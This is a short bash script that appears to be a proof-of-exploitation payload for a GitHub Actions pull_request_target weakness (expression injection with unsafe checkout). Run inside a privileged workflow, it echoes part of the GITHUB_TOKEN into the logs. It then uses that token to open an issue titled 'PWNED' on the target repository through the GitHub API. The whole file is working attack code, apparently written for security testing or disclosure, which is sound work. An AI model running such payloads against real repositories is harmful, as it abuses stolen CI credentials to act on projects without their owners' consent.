#!/bin/bash
echo "=== ATTACKER CODE EXECUTING WITH PRIVILEGED TOKEN ==="
echo "Token: ${GITHUB_TOKEN:0:20}..."
echo "Repo: $GITHUB_REPOSITORY"
# Create proof-of-exploitation issue
curl -sf -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"PWNED: expression injection + unsafe checkout","body":"Attacker-controlled code executed with privileged GITHUB_TOKEN via pull_request_target. Token had Issues:write and PullRequests:write on base repo."}' \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues" || echo "curl failed"
